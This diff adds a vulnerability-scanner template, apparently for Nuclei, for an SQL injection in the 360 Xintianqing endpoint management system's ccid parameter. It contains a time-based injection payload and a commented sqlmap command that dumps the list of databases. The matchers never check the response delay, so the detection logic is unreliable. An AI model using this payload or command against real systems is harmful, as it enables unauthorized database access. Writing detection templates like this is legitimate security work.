@@ -1,0 +1,25 @@
+id: 360-xintianqing-ccid-sql-injection
+
+info:
+  name: 360 新天擎终端安全管理系统存在SQL注入漏洞
+  author: Ashro
+  description: 360 新天擎终端安全管理系统中，/api/dp/rptsvcsyncpoint?ccid=1文件存在SQL注入。
+  reference:
+    - https://example.com/reference-to-vulnerability
+  severity: high
+  tags: info-leak
+#python .\sqlmap.py --batch -dbs -u https://{{Hostname}}/api/dp/rptsvcsyncpoint?ccid=1
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/dp/rptsvcsyncpoint?ccid=1';SELECT PG_SLEEP(5)--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "client"
+      - type: status
+        status:
+          - 200
